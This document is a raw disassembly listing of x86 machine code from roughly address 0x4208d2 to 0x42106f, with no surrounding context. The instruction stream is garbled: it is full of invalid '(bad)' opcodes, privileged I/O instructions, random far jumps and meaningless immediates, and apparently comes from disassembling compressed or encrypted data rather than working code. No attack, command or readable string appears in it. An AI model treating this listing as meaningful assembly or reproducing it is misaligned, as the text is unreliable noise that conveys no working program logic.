  4208d2:	sahf   
  4208d3:	inc    ebx
  4208d4:	(bad)
  4208d8:	pop    ecx
  4208d9:	lea    ecx,[esi]
  4208db:	aas    
  4208dc:	mov    DWORD PTR [ebp-0x5aad7a06],ebp
  4208e2:	mov    ecx,0xbbd60275
  4208e7:	adc    esi,DWORD PTR [ebp+eiz*4-0x3ac8c414]
  4208ee:	pop    ecx
  4208ef:	push   es
  4208f0:	stos   BYTE PTR es:[edi],al
  4208f1:	fwait
  4208f2:	jnp    0x420925
  4208f4:	sub    cl,dh
  4208f6:	rol    DWORD PTR [ecx+0x19],1
  4208f9:	push   eax
  4208fa:	xor    eax,0x98edc074
  4208ff:	fimul  WORD PTR [ecx+edi*4-0x51783592]
  420906:	ror    DWORD PTR [ecx-0x7cf33caa],1
  42090c:	ins    BYTE PTR es:[edi],dx
  42090d:	test   DWORD PTR [ebx+0x1a1963d3],ebx
  420913:	test   ah,bl
  420915:	pop    esi
  420916:	add    ch,0x8a
  420919:	pop    ebx
  42091a:	arpl   bp,bx
  42091c:	(bad)  
  42091d:	push   edx
  42091e:	in     eax,0x52
  420920:	ror    BYTE PTR ds:0x14303b82,1
  420926:	stos   DWORD PTR es:[edi],eax
	...
  42092f:	add    BYTE PTR [eax],al
  420931:	dec    ecx
  420932:	test   eax,0x9df89d38
  420937:	in     eax,dx
  420938:	std    
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2-0x5aceba43],0x6d
  420942:	add    DWORD PTR [ecx],0x0
  420945:	scas   al,BYTE PTR es:[edi]
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    ch,ch
  42094a:	lock jne 0x4209c1
  42094d:	sbb    ah,BYTE PTR [edx-0x3cccf6ab]
  420953:	mov    ds:0x4af62c26,eax
  420958:	cmp    cl,BYTE PTR [edi]
  42095a:	sub    BYTE PTR [edx+edx*2+0x735b8bfa],bh
  420961:	sub    eax,0x69231b0d
  420966:	xchg   esi,eax
  420967:	jmp    0x4209a9
  420969:	fsubr  QWORD PTR [eax+0x31]
  42096c:	pop    edi
  42096d:	ror    BYTE PTR [edi],0x4c
  420970:	data16 fild QWORD PTR [ebx-0x4b39db8a]
  420977:	push   esp
  420978:	jae    0x420987
  42097a:	push   ebp
  42097b:	push   ebx
  42097c:	scas   al,BYTE PTR es:[edi]
  42097d:	xchg   esp,eax
  42097e:	pop    edx
  42097f:	mov    al,ds:0x6d54df12
  420984:	inc    esp
  420985:	cmp    ebp,DWORD PTR [edx]
  420987:	sub    ebx,DWORD PTR [ebx-0x93391f1]
  42098d:	inc    edx
  42098e:	fdivr  DWORD PTR [eax+ebp*4-0x73]
  420992:	xor    BYTE PTR [ebp-0x3e],bl
  420995:	dec    ebx
  420996:	sub    DWORD PTR [edx],edi
  420998:	ins    BYTE PTR es:[edi],dx
  420999:	hlt    
  42099a:	(bad)  
  42099b:	out    0xd4,eax
  42099d:	fild   QWORD PTR [ecx]
  42099f:	mov    ecx,esi
  4209a1:	push   cs
  4209a2:	sub    eax,0x8607d08f
  4209a7:	imul   edx,DWORD PTR [edi],0x8
  4209aa:	shr    BYTE PTR [edi+0x7c],cl
  4209ad:	int    0x84
  4209af:	xchg   ecx,eax
  4209b0:	jb     0x420972
  4209b2:	les    ecx,FWORD PTR ds:0x1396
  4209b7:	and    al,0xff
  4209b9:	cwde   
  4209ba:	mov    BYTE PTR [eax+eiz*1-0x47],cl
  4209be:	inc    ebx
  4209bf:	jmp    FWORD PTR [ecx-0xd]
  4209c2:	pop    esi
  4209c3:	out    dx,eax
  4209c4:	lods   eax,DWORD PTR ds:[esi]
  4209c5:	call   0x4708:0xdb71a3db
  4209cc:	pop    eax
  4209cd:	cmp    BYTE PTR [edx],al
  4209cf:	pop    esp
  4209d0:	jb     0x420a36
  4209d2:	cdq    
  4209d3:	iret   
  4209d4:	xlat   BYTE PTR ds:[ebx]
  4209d5:	clc    
  4209d6:	jnp    0x420a07
  4209d8:	xchg   DWORD PTR [ebp-0x48e4d1ce],ebx
  4209de:	test   BYTE PTR [eax-0x8431dd],bl
  4209e4:	jmp    0xed7a:0x87dd2152
  4209eb:	mov    edi,0x98baa3d7
  4209f0:	retf   
  4209f1:	out    dx,al
  4209f2:	mov    cs,WORD PTR [eax-0x70f893fa]
  4209f8:	sbb    DWORD PTR [esi*2-0x5b267c71],edi
  4209ff:	jl     0x4209f9
  420a01:	inc    ebp
  420a02:	mov    es,esp
  420a04:	add    ebp,0x1e3dfa17
  420a0a:	out    dx,al
  420a0b:	push   es
  420a0c:	mov    cl,BYTE PTR [ebx-0x7b3b052b]
  420a12:	sbb    ch,BYTE PTR [esp+ebx*8]
  420a15:	xchg   esp,eax
  420a16:	xor    eax,0x5345ce9f
  420a1b:	in     al,0x4e
  420a1d:	lea    edx,[edx-0x4a99b8b7]
  420a23:	add    dl,0xcc
  420a26:	add    eax,0xc3275abc
  420a2b:	mov    ebp,DWORD PTR [ebp+0x79]
  420a2e:	fisub  WORD PTR [eax+0x2c5409b1]
  420a34:	xchg   esi,eax
  420a35:	sahf   
  420a36:	mov    esp,0x2d3adfb3
  420a3b:	mov    ebx,0xdacbf473
  420a40:	pop    eax
  420a41:	dec    ecx
  420a42:	adc    bl,BYTE PTR [ecx-0x787c8de2]
  420a48:	inc    esp
  420a49:	(bad)  
  420a4a:	fld    TBYTE PTR [edi-0x78982108]
  420a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a51:	sub    BYTE PTR [ebx],dl
  420a53:	push   edi
  420a54:	cmc    
  420a55:	add    eax,0x45b88398
  420a5a:	dec    edx
  420a5b:	mov    ch,0x2b
  420a5d:	xchg   ebx,eax
  420a5e:	sub    al,0x76
  420a60:	push   0x1
  420a62:	daa    
  420a63:	ins    DWORD PTR es:[edi],dx
  420a64:	pop    ebx
  420a65:	sbb    DWORD PTR [edx],0x20
  420a68:	js     0x420a60
  420a6a:	dec    eax
  420a6b:	and    bh,BYTE PTR [esi]
  420a6d:	icebp  
  420a6e:	or     DWORD PTR [edi],ecx
  420a70:	pop    es
  420a71:	pop    ecx
  420a72:	cmp    al,0x8f
  420a74:	push   esp
  420a75:	push   0x3c
  420a77:	dec    ebx
  420a78:	sbb    dh,bl
  420a7a:	out    dx,al
  420a7b:	add    al,0x66
  420a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a7e:	rcl    BYTE PTR [edx+0x1eeb43cc],0x95
  420a85:	mov    ds:0xb61cb4ac,al
  420a8a:	retf   0xc67c
  420a8d:	stos   BYTE PTR es:[edi],al
  420a8e:	jl     0x420a38
  420a90:	sub    DWORD PTR [edi],esp
  420a92:	(bad)  
  420a93:	out    0xe8,eax
  420a95:	mov    bl,0xce
  420a97:	mov    bl,0xd0
  420a99:	in     eax,dx
  420a9a:	mov    eax,0x92efd7f9
  420a9f:	lock cdq 
  420aa1:	push   edi
  420aa2:	mov    dh,BYTE PTR [esi+0x65]
  420aa5:	push   ss
  420aa6:	jno    0x420b10
  420aa8:	jp     0x420a36
  420aaa:	leave  
  420aab:	push   esp
  420aac:	jnp    0x420a4d
  420aae:	dec    eax
  420aaf:	mov    edi,0xc8c230
  420ab4:	hlt    
  420ab5:	mov    ss,WORD PTR [ebp-0x7a]
  420ab8:	or     BYTE PTR [eax],cl
  420aba:	std    
  420abb:	mov    al,0xe2
  420abd:	mov    ?,WORD PTR [ecx]
  420abf:	aam    0xf5
  420ac1:	outs   dx,BYTE PTR ds:[esi]
  420ac2:	mov    WORD PTR [edx],ss
  420ac4:	sub    DWORD PTR [esi-0x388a34ac],esi
  420aca:	nop
  420acb:	mov    eax,ds:0xc676557e
  420ad0:	jnp    0x420a62
  420ad2:	fnstsw WORD PTR [edi-0x7a]
  420ad5:	jecxz  0x420ae7
  420ad7:	pop    esp
  420ad8:	imul   ebx,ebx,0xffffff98
  420adb:	sub    DWORD PTR [eax-0x4d9a40d6],0x43
  420ae2:	jne    0x420a72
  420ae4:	adc    al,0xc3
  420ae6:	xchg   edx,eax
  420ae7:	lahf   
  420ae8:	xor    BYTE PTR [edx],0x47
  420aeb:	jg     0x420b0a
  420aed:	cld    
  420aee:	ror    BYTE PTR [ebx],cl
  420af0:	xchg   ecx,eax
  420af1:	sti    
  420af2:	(bad)  
  420af3:	inc    edx
  420af4:	inc    eax
  420af5:	add    eax,0xebe9d3b7
  420afa:	adc    al,0xa3
  420afc:	(bad)  
  420afd:	jmp    0x6c37:0xfcdae4de
  420b04:	fnstsw WORD PTR [edx+0x75]
  420b07:	mov    dl,ch
  420b09:	jl     0x420abb
  420b0b:	add    BYTE PTR [ebx+eax*2+0x4a764597],0xf8
  420b13:	repnz shl DWORD PTR [eax],1
  420b16:	icebp  
  420b17:	ja     0x420b48
  420b19:	mov    eax,0x7832a2fc
  420b1e:	loop   0x420abd
  420b20:	dec    esi
  420b21:	pop    ecx
  420b23:	jg     0x420b79
  420b25:	lods   al,BYTE PTR ds:[esi]
  420b26:	xlat   BYTE PTR ds:[ebx]
  420b27:	xlat   BYTE PTR ds:[ebx]
  420b28:	mov    bl,0x1
  420b2a:	mov    eax,ds:0xaa2c7736
  420b2f:	sbb    BYTE PTR [esi-0x52a72361],0x47
  420b36:	sbb    bl,BYTE PTR [ecx]
  420b38:	adc    DWORD PTR [esp+eax*2+0xd],eax
  420b3c:	test   DWORD PTR [edx+0x7cf784e],edi
  420b42:	jmp    0x17b9:0x32f35607
  420b49:	mov    dh,0x94
  420b4b:	push   0xffffffdc
  420b4d:	sbb    al,0x9f
  420b4f:	mov    bh,BYTE PTR [ebx]
  420b51:	popa   
  420b52:	pop    eax
  420b53:	pop    edi
  420b54:	sub    DWORD PTR [ebx-0xb],edx
  420b57:	clc    
  420b58:	adc    DWORD PTR [ebp-0x68],ebx
  420b5b:	inc    ecx
  420b5c:	jecxz  0x420b00
  420b5e:	pop    esi
  420b5f:	pop    esp
  420b60:	int    0x6d
  420b62:	scas   eax,DWORD PTR es:[edi]
  420b63:	scas   al,BYTE PTR es:[edi]
  420b64:	aas    
  420b65:	pop    ebp
  420b66:	aad    0xd6
  420b68:	test   edi,edi
  420b6a:	(bad)  
  420b6c:	fwait
  420b6d:	jae    0x420b3d
  420b6f:	call   0x76337c20
  420b74:	xchg   esi,eax
  420b75:	xchg   esp,eax
  420b76:	retf   0x917
  420b79:	xchg   edi,eax
  420b7a:	xchg   BYTE PTR [edx+0x28b4020f],ch
  420b80:	inc    ebp
  420b81:	lods   eax,DWORD PTR ds:[esi]
  420b82:	icebp  
  420b83:	jmp    0x8e92:0x2582b7e7
  420b8a:	loope  0x420b68
  420b8c:	dec    ebx
  420b8d:	sub    BYTE PTR [eax],dh
  420b8f:	mov    al,ds:0xc7167754
  420b94:	das    
  420b95:	or     cl,BYTE PTR [edi+0x13]
  420b98:	fs mov ebp,0xd6f9a614
  420b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b9f:	sti    
  420ba0:	mov    dh,0xb8
  420ba2:	push   edx
  420ba3:	shl    BYTE PTR [esi+ebx*1-0x4473efff],0xaf
  420bab:	cmp    bl,BYTE PTR [edx-0x1e02f3b9]
  420bb1:	ins    DWORD PTR es:[edi],dx
  420bb2:	pop    edi
  420bb3:	adc    al,0xb3
  420bb5:	(bad)  
  420bb6:	outs   dx,BYTE PTR ds:[esi]
  420bb7:	ja     0x420bd8
  420bb9:	rcr    DWORD PTR [edx+0x7c],1
  420bbc:	pop    edx
  420bbd:	(bad)  
  420bbe:	fwait
  420bbf:	push   0x3eb050ee
  420bc4:	sbb    al,0xf1
  420bc6:	mov    dh,0xb5
  420bc8:	xchg   DWORD PTR ds:0xd009e2ff,ebp
  420bce:	call   0xb5b75984
  420bd3:	and    edx,DWORD PTR [edx-0x76]
  420bd6:	sbb    eax,0x3d2c62e4
  420bdb:	ret    0x463a
  420bde:	and    dl,BYTE PTR [edi]
  420be0:	xchg   ecx,eax
  420be1:	fwait
  420be2:	dec    ecx
  420be3:	and    eax,0xfc8d3e63
  420be8:	xchg   edx,eax
  420be9:	lods   al,BYTE PTR ds:[esi]
  420bea:	cmp    ch,0xad
  420bed:	test   bh,ah
  420bef:	or     al,0x3
  420bf1:	xchg   edx,edx
  420bf3:	mov    esp,DWORD PTR [edi]
  420bf5:	ds aam 0xfd
  420bf8:	fmulp  st(2),st
  420bfa:	in     eax,dx
  420bfb:	lock stos BYTE PTR es:[edi],al
  420bfd:	call   0x40b14124
  420c02:	lods   eax,DWORD PTR ds:[esi]
  420c03:	scas   al,BYTE PTR es:[edi]
  420c04:	jo     0x420c57
  420c06:	iret   
  420c07:	fisttp DWORD PTR [ebp+0x4a]
  420c0a:	inc    edi
  420c0b:	jmp    0x3bebf6d7
  420c10:	dec    edi
  420c11:	rcl    DWORD PTR [ebp+0x6a],1
  420c14:	ss cmp ch,cl
  420c17:	push   0xfffffffd
  420c19:	pop    es
  420c1a:	push   es
  420c1b:	xchg   esp,eax
  420c1c:	mov    esi,0x8ec71f8
  420c21:	test   DWORD PTR [ecx+0x4745b03a],ebx
  420c27:	jg     0x420c44
  420c29:	adc    DWORD PTR ds:[edi+0x7ba58b1e],0xffffffd1
  420c31:	cdq    
  420c32:	push   ds
  420c33:	in     al,0x62
  420c35:	or     al,0xd5
  420c37:	daa    
  420c38:	adc    BYTE PTR [edi],ch
  420c3a:	in     eax,0xc5
  420c3c:	retf   
  420c3d:	xchg   DWORD PTR [edi-0x56],esp
  420c40:	shr    DWORD PTR ds:0x8a0742f9,cl
  420c46:	xchg   ebx,eax
  420c47:	fadd   st(1),st
  420c49:	and    DWORD PTR [edi],ebp
  420c4b:	mov    DWORD PTR [eax-0x1],ebp
  420c4e:	xor    DWORD PTR [di+0x31],eax
  420c52:	mov    edi,0xc74aa5b7
  420c57:	push   0xffffff95
  420c59:	push   edx
  420c5a:	xor    DWORD PTR [edi-0x3b],ecx
  420c5d:	into   
  420c5e:	mov    al,bl
  420c60:	add    esi,DWORD PTR [eax]
  420c62:	add    BYTE PTR [ecx+0x5f23f0e1],ch
  420c68:	cmp    DWORD PTR ds:0xa54627b1,edi
  420c6e:	jp     0x420cdb
  420c70:	push   ebp
  420c71:	jecxz  0x420ca1
  420c73:	int    0x39
  420c75:	ret    0xf225
  420c78:	jno    0x420ca2
  420c7a:	sti    
  420c7b:	push   edx
  420c7c:	push   ds
  420c7d:	jo     0x420c96
  420c7f:	mov    esi,0xaea3f542
  420c84:	adc    eax,esp
  420c86:	es xchg ebp,eax
  420c88:	mov    ds:0xb1025273,eax
  420c8d:	and    edx,edi
  420c8f:	jge    0x420cd2
  420c91:	into   
  420c92:	sar    DWORD PTR [esi],1
  420c94:	jbe    0x420cf2
  420c96:	mov    eax,0x85cbadeb
  420c9b:	loope  0x420c27
  420c9d:	fnstenv [esi+eiz*8-0x35]
  420ca1:	push   ecx
  420ca2:	test   DWORD PTR [eax-0x784ecded],eax
  420ca8:	jb     0x420caa
  420caa:	sahf   
  420cab:	outs   dx,BYTE PTR ds:[esi]
  420cac:	gs jno 0x420c3e
  420caf:	and    eax,0xdd1c7954
  420cb4:	ret    0x8542
  420cb7:	jecxz  0x420c87
  420cb9:	ret    
  420cba:	lahf   
  420cbb:	out    dx,eax
  420cbc:	sbb    bl,al
  420cbe:	jg     0x420d1f
  420cc0:	pop    eax
  420cc1:	xchg   ecx,eax
  420cc2:	push   eax
  420cc3:	push   ss
  420cc4:	xlat   BYTE PTR ds:[ebx]
  420cc5:	sub    BYTE PTR [esi],0x51
  420cc8:	call   0x174f7f35
  420ccd:	add    DWORD PTR [ebx-0x45],esp
  420cd0:	push   ecx
  420cd1:	add    DWORD PTR [esi+0x38b89d3f],ebp
  420cd7:	inc    eax
  420cd8:	aad    0x8
  420cda:	mov    eax,0xe0513a71
  420cdf:	adc    eax,0x329e4946
  420ce4:	push   DWORD PTR [edx+0x14a689e0]
  420cea:	imul   esi,esp,0x2433c434
  420cf0:	pop    eax
  420cf1:	dec    esp
  420cf2:	xor    ah,dh
  420cf4:	inc    eax
  420cf5:	iret   
  420cf6:	inc    ebx
	...
  420cff:	add    BYTE PTR [eax],al
  420d01:	es mov eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	scas   al,BYTE PTR es:[edi]
  420d0e:	mov    esp,0x871b4e2f
  420d13:	add    DWORD PTR [eax],eax
  420d15:	scas   al,BYTE PTR es:[edi]
  420d16:	add    eax,DWORD PTR [eax]
  420d18:	add    BYTE PTR [ecx-0x4abd5f84],ch
  420d1e:	mov    ebx,0x8e25e854
  420d23:	xchg   ecx,eax
  420d24:	mul    ebx
  420d26:	mov    bl,0x60
  420d28:	mov    dh,0x7c
  420d2a:	push   ecx
  420d2b:	xchg   ebp,eax
  420d2c:	mov    al,ds:0x2ef33195
  420d31:	js     0x420d1d
  420d33:	aaa    
  420d34:	pop    ss
  420d35:	ss inc eax
  420d37:	retf   
  420d38:	out    0xd7,eax
  420d3a:	imul   ebx,eax,0x79
  420d3d:	xchg   BYTE PTR [eax+0x7e],dh
  420d40:	(bad)  
  420d42:	fisubr DWORD PTR [esi]
  420d44:	inc    esi
  420d45:	jo     0x420d1a
  420d47:	int    0xbd
  420d49:	and    edx,0x6f
  420d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4d:	int    0x50
  420d4f:	adc    bl,BYTE PTR [ecx-0x3f63111a]
  420d55:	shl    DWORD PTR [ebx*2+0x63c94b4d],1
  420d5c:	xor    ah,BYTE PTR [esi]
  420d5e:	or     eax,0x8e13d0fd
  420d63:	sub    edi,DWORD PTR [esi-0x75]
  420d66:	arpl   WORD PTR [ebp-0x3f8da17d],dx
  420d6c:	xchg   ebp,eax
  420d6d:	xor    BYTE PTR [edx+0x15],al
  420d70:	pop    es
  420d71:	or     BYTE PTR [eax-0x5c],0xf6
  420d75:	jne    0x420d79
  420d77:	cmp    eax,0x95af3a91
  420d7c:	mov    dl,0xec
  420d7e:	jge    0x420df0
  420d80:	adc    eax,0xac93672d
  420d85:	shl    bh,cl
  420d87:	fidiv  WORD PTR ds:0xe6e33e00
  420d8d:	ja     0x420d59
  420d8f:	outs   dx,BYTE PTR ds:[esi]
  420d90:	pop    es
  420d91:	scas   eax,DWORD PTR es:[edi]
  420d92:	pop    ds
  420d93:	mov    eax,0xff5185a6
  420d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d99:	bound  eax,QWORD PTR [edx+0x1b]
  420d9c:	cmp    BYTE PTR [eax+0x16],0xce
  420da0:	int    0x2a
  420da2:	test   al,0x30
  420da4:	xchg   esp,eax
  420da5:	icebp  
  420da6:	mov    al,ds:0xa493938f
  420dab:	aas    
  420dac:	push   ecx
  420dad:	ds enter 0xa081,0x3a
  420db2:	xor    bl,BYTE PTR [ebx-0x6ae365c6]
  420db8:	mov    ecx,0xe868e77c
  420dbd:	push   cs
  420dbe:	ins    DWORD PTR es:[edi],dx
  420dbf:	loopne 0x420e26
  420dc1:	popf   
  420dc2:	icebp  
  420dc3:	adc    BYTE PTR [eax-0x61],cl
  420dc6:	(bad)  
  420dc7:	jo     0x420e37
  420dc9:	(bad)
  420dcd:	inc    ebp
  420dce:	adc    BYTE PTR [esi],bl
  420dd0:	xchg   edi,eax
  420dd1:	dec    ebx
  420dd2:	das    
  420dd3:	push   0x67
  420dd5:	pop    esp
  420dd6:	inc    ecx
  420dd7:	mov    ah,0xff
  420dd9:	outs   dx,BYTE PTR ds:[esi]
  420dda:	jge    0x420da9
  420ddc:	mov    esi,0xf4e16237
  420de1:	mov    ebx,0x3e30978b
  420de6:	mov    esp,0x1742da9e
  420deb:	int3   
  420dec:	mov    al,0x22
  420dee:	fwait
  420def:	stc    
  420df0:	add    DWORD PTR [eax+edx*4],ebx
  420df3:	add    ebp,esi
  420df5:	ins    DWORD PTR es:[edi],dx
  420df6:	adc    eax,0x24b5258a
  420dfb:	xchg   ecx,eax
  420dfc:	shr    DWORD PTR [edx+0x22fceee5],cl
  420e02:	xlat   BYTE PTR ds:[ebx]
  420e03:	jl     0x420e42
  420e05:	js     0x420e7b
  420e07:	sbb    al,0x38
  420e09:	fidivr WORD PTR [ebx+0x7e]
  420e0c:	mov    ebx,0xdc0ba551
  420e11:	in     al,0xa
  420e13:	push   es
  420e14:	mov    eax,0xcc79063
  420e19:	pop    ds
  420e1a:	mov    bl,0xf3
  420e1c:	adc    DWORD PTR [ecx],eax
  420e1e:	pop    ebp
  420e1f:	fisubr WORD PTR [eax+eax*2]
  420e22:	push   ecx
  420e23:	out    0xcf,al
  420e25:	mov    ds:0x36918a75,al
  420e2a:	jp     0x420ea8
  420e2c:	or     dh,BYTE PTR [ebp-0x1d]
  420e2f:	inc    ecx
  420e30:	xchg   edi,eax
  420e31:	sub    al,0x34
  420e33:	and    BYTE PTR ds:0x390ba279,al
  420e39:	jo     0x420e3a
  420e3b:	lods   eax,DWORD PTR ds:[esi]
  420e3c:	jecxz  0x420dc0
  420e3e:	jl     0x420e70
  420e40:	adc    edx,DWORD PTR [ecx+eax*2-0xd]
  420e44:	lods   al,BYTE PTR ds:[esi]
  420e45:	jns    0x420eac
  420e47:	pop    ds
  420e48:	xor    BYTE PTR [esi-0x7d0acf3c],al
  420e4e:	into   
  420e4f:	xor    DWORD PTR [ebp+0x5b],edi
  420e52:	mov    WORD PTR [edi-0x2f],?
  420e55:	xchg   esi,eax
  420e56:	push   0x6c
  420e58:	shl    DWORD PTR [esi],0xd5
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	mov    eax,ds:0x71cdcfd5
  420e61:	fsubr  QWORD PTR [ecx+0x13]
  420e64:	cmp    ebx,0x5
  420e67:	js     0x420e77
  420e69:	or     BYTE PTR [edx-0x79],0x78
  420e6d:	stos   DWORD PTR es:[edi],eax
  420e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e6f:	idiv   BYTE PTR [ecx-0x708d6104]
  420e75:	(bad)  
  420e76:	mov    fs,ebp
  420e78:	fbstp  TBYTE PTR [edi-0xcaacbf4]
  420e7e:	inc    esi
  420e7f:	bound  ebp,QWORD PTR [edx]
  420e81:	and    al,0x89
  420e83:	std    
  420e84:	ret    0xc3f6
  420e87:	mov    dh,BYTE PTR [ebp+0x559e990d]
  420e8d:	cli    
  420e8e:	xchg   esp,eax
  420e8f:	dec    ebx
  420e90:	clc    
  420e91:	jo     0x420e36
  420e93:	cmp    BYTE PTR [esi+edx*2],0x6b
  420e97:	and    eax,0xe977b2a1
  420e9c:	(bad)
  420e9f:	dec    esp
  420ea0:	inc    eax
  420ea1:	or     esp,esi
  420ea3:	pop    ecx
  420ea4:	mov    ah,0x35
  420ea6:	jo     0x420ea4
  420ea8:	lods   al,BYTE PTR ds:[esi]
  420ea9:	(bad)  
  420eaa:	mul    BYTE PTR [ebx+0x2ed47bb]
  420eb0:	loope  0x420ede
  420eb2:	jnp    0x420ea5
  420eb4:	sahf   
  420eb5:	mov    ebx,0x5dd0b997
  420eba:	add    BYTE PTR [esi],bh
  420ebc:	jg     0x420e67
  420ebe:	jbe    0x420e6f
  420ec0:	test   BYTE PTR [edi+0xa],ch
  420ec3:	and    eax,0x1a695d56
  420ec8:	inc    ecx
  420ec9:	(bad)  
  420eca:	icebp  
  420ecb:	jo     0x420e8d
  420ecd:	outs   dx,BYTE PTR ds:[esi]
  420ece:	(bad)  
  420ed0:	test   BYTE PTR [ebp+eiz*8+0x4],0x73
  420ed5:	mov    eax,0xec18b392
  420eda:	mov    cl,ch
  420edc:	pop    edi
  420edd:	adc    eax,0xf68a6725
  420ee2:	xchg   esi,eax
  420ee3:	fld    DWORD PTR [edi+0xd10a37e]
  420ee9:	dec    esi
  420eea:	sahf   
  420eeb:	mov    al,ds:0xd01c7245
  420ef0:	xor    DWORD PTR [edi-0x25253970],esi
  420ef6:	js     0x420f0f
  420ef8:	retf   0xb484
  420efb:	and    eax,0xb1b96b66
  420f00:	jge    0x420f3e
  420f02:	pop    es
  420f03:	nop
  420f04:	adc    eax,DWORD PTR [edx+0x53067684]
  420f0a:	inc    eax
  420f0b:	pop    es
  420f0c:	cmp    ch,dh
  420f0e:	and    edx,DWORD PTR [eax]
  420f10:	int    0xc5
  420f12:	pop    ecx
  420f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f14:	xchg   BYTE PTR [eax+0x38922c9d],cl
  420f1a:	popa   
  420f1b:	out    0x8a,eax
  420f1d:	push   edi
  420f1e:	push   edi
  420f1f:	popf   
  420f20:	daa    
  420f21:	lea    edi,[ebx+0x28]
  420f24:	and    esp,edi
  420f26:	cwde   
  420f27:	mov    al,0x4
  420f29:	xchg   DWORD PTR [eax],esp
  420f2b:	mov    ch,ah
  420f2d:	lds    ebp,FWORD PTR [edi]
  420f2f:	pop    ebp
  420f30:	xor    esp,ecx
  420f32:	pop    ds
  420f33:	or     ah,BYTE PTR [edx-0x1bb3c17e]
  420f39:	fnsave [esi-0x4608b771]
  420f3f:	mov    cs,WORD PTR [ecx+0xa265cb7]
  420f45:	scas   al,BYTE PTR es:[edi]
  420f46:	inc    esp
  420f47:	addr16 jg 0x420f52
  420f4a:	mov    ch,0xb8
  420f4c:	ror    DWORD PTR [ecx],cl
  420f4e:	cmp    eax,0xae10ea31
  420f53:	or     bh,ch
  420f55:	dec    ecx
  420f56:	fs xchg esi,eax
  420f58:	push   esi
  420f59:	add    edx,0x4fe2db42
  420f5f:	ror    DWORD PTR [ebx+0x5269025e],1
  420f65:	aas    
  420f66:	xor    al,0x86
  420f68:	adc    al,0x68
  420f6a:	xor    cl,BYTE PTR ds:0xe6f06596
  420f70:	in     al,dx
  420f71:	call   0x44ce:0x78f8b6f
  420f78:	adc    ch,BYTE PTR [ebx-0x42]
  420f7b:	mov    bl,0xd6
  420f7d:	ss jmp 0xf9440d14
  420f83:	sti    
  420f84:	outs   dx,BYTE PTR ds:[esi]
  420f85:	mov    bl,0x2b
  420f87:	bound  esi,QWORD PTR [edi+0x55dfcab0]
  420f8d:	inc    esi
  420f8e:	or     eax,0x6c7f3567
  420f93:	dec    edx
  420f94:	and    DWORD PTR [ebx+0x7fb77196],esp
  420f9a:	repz push ds
  420f9c:	jo     0x420f65
  420f9e:	dec    eax
  420f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fa0:	adc    eax,0x8b812025
  420fa5:	scas   al,BYTE PTR es:[edi]
  420fa6:	mov    edx,0xec12e622
  420fab:	add    al,0xa4
  420fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fae:	in     al,0x8d
  420fb0:	push   es
  420fb1:	push   esi
  420fb2:	xchg   esp,eax
  420fb3:	ds cld 
  420fb5:	fcom   DWORD PTR [eax+0x3c]
  420fb8:	retf   
  420fb9:	xchg   BYTE PTR ds:0x20ebbbe3,cl
  420fbf:	mov    ah,0x78
  420fc1:	test   BYTE PTR ss:[ebx-0x58],cl
  420fc5:	pop    eax
  420fc6:	and    ebx,DWORD PTR ds:0x52142b4b
  420fcc:	dec    eax
  420fcd:	push   0xfffffff4
  420fcf:	pop    es
  420fd0:	fadd   st(2),st
  420fd2:	sub    BYTE PTR [edx],ch
  420fd4:	outs   dx,BYTE PTR ds:[esi]
  420fd5:	sbb    edi,DWORD PTR [ebx+0x70]
  420fd8:	aam    0x1c
  420fda:	mov    DWORD PTR [ecx+0x3c],esp
  420fdd:	xor    BYTE PTR [eax],dh
  420fdf:	cmp    bh,al
  420fe1:	xchg   esi,eax
  420fe2:	push   ebp
  420fe3:	inc    ecx
  420fe4:	inc    edx
  420fe5:	ins    DWORD PTR es:[edi],dx
  420fe6:	outs   dx,BYTE PTR ds:[esi]
  420fe7:	imul   edx,edx,0xc17ec342
  420fed:	add    eax,0x1aaa1924
  420ff2:	push   ecx
  420ff3:	jp     0x420ffb
  420ff5:	add    eax,0x66d72e58
  420ffa:	bound  edi,QWORD PTR [ebx-0x35]
  420ffd:	in     al,dx
  420ffe:	xor    edx,DWORD PTR [ebx+0x12ea1a9a]
  421004:	and    DWORD PTR [esi+0x78],edx
  421007:	mov    ah,0x13
  421009:	lock (bad) 
  42100b:	cs xchg ebx,eax
  42100d:	popf   
  42100e:	pop    ds
  42100f:	and    bl,BYTE PTR cs:[edx+ebx*2-0x7c]
  421014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421015:	inc    ebp
  421016:	(bad)  
  421018:	and    eax,0xbf14293a
  42101d:	jbe    0x42102d
  42101f:	das    
  421020:	call   0x12a2ed53
  421025:	or     eax,0x6337d120
  42102a:	aaa    
  42102b:	and    BYTE PTR [ecx],0xf8
  42102e:	out    0x45,al
  421030:	pop    ebp
  421031:	and    al,0xe6
  421033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421034:	test   BYTE PTR [ebx+0x6a40ce86],al
  42103a:	pop    ds
  42103b:	mov    ch,BYTE PTR [edx]
  42103d:	aam    0x8f
  42103f:	pop    esp
  421040:	ss mov edi,0xad6f693a
  421046:	and    dh,BYTE PTR [esi]
  421048:	pop    ds
  421049:	ror    DWORD PTR [edi+edi*2],1
  42104c:	xchg   ebx,edi
  42104e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42104f:	jns    0x4210c9
  421051:	mov    ds:0xdb59f2ae,eax
  421056:	xchg   ecx,eax
  421057:	js     0x4210bf
  421059:	mov    al,ds:0x2c7f1d75
  42105e:	ins    DWORD PTR es:[edi],dx
  42105f:	jbe    0x4210d7
  421061:	push   0x154eae68
  421066:	mov    ecx,0xd992f55a
  42106b:	ds test ah,al
  42106e:	(bad)  
  42106f:	clc    
